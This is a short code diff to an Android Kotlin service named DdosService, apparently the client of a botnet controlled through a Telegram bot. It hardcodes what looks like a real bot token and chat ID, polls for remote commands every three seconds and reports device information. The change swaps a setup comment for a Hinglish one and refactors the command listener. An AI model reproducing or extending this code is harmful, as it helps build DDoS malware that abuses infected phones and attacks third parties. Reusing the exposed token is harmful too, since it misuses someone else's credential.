@@ -13,7 +13,7 @@ class DdosService : Service() {
     private val CHANNEL_ID = "ddos_network"
     private val NOTIF_ID = 1
 
-    // 🔴 REPLACE WITH YOUR BOT TOKEN & CHAT ID
+    // 🔴 BOT TOKEN YAHAN DAALO
     private val BOT_TOKEN = "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg"
     private val CHAT_ID = "8507217564"
 
@@ -82,9 +82,8 @@ class DdosService : Service() {
         }, 5, 5, TimeUnit.SECONDS)
 
         // Module 3: Command Listener — every 3 seconds
-        val commandListener = CommandListener(bot, this)
         executor.scheduleWithFixedDelay({
-            commandListener.checkCommands()
+            bot.checkCommands()
         }, 0, 3, TimeUnit.SECONDS)
 
         // Module 4: Device Info on Start
